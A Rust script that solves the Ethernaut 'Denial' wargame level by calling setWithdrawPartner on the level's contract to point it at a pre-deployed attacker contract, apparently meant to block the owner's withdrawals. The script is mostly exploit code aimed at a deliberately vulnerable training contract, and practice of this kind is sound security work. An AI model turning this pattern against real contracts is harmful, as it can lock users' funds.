#[allow(unused_imports)]
use alloy::{
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Address, B256, Bytes, U256, address,
        keccak256,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol!{
    #[sol(rpc)]
    contract Denial {
        function partner() external view returns (address);
        function setWithdrawPartner(address _partner) public;
    }
}

use crate::ethernaut;
use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level20_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level20())?;
    
    Ok(())
}

async fn level20() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);
    
    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;

    let denial_address = "0xe69daA1aAABcd7BCE73DF634380eaF6ecE53102E".parse()?;
    let denial = Denial::new(denial_address, provider.clone());
    let exp_address: Address = "0x835d3280DCaf007459997cBFCeB07819494F6977".parse()?;

    println!("[CHECK]");
    let mut partner = denial.partner().call().await?;
    println!("[Denial.parner()]    partner = {:064x}\n", partner);

    let set_tx = denial.setWithdrawPartner(exp_address)
        .send()
        .await?;
    println!("[Denial.set()]    Pending transaction... {}", set_tx.tx_hash());
    let set_receipt = set_tx.get_receipt().await?;
    println!(
        "[Denial.set()]    Transaction included in block {}",
        set_receipt.block_number.expect("Failed to get block number")
    );
    
    println!("[CHECK]");
    partner = denial.partner().call().await?;
    println!("[Denial.parner()]    partner = {:064x}\n", partner);

    Ok(())
}
